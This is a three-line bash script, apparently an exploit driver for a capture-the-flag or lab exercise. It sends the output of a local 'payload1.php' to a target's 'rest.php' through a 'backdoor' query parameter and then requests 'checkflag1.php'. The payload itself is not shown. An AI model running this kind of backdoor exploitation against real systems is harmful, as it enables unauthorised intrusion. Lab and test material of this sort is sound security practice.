#!/bin/bash
curl "$1/rest.php/?backdoor=$(php payload1.php)"
curl "$1/checkflag1.php"
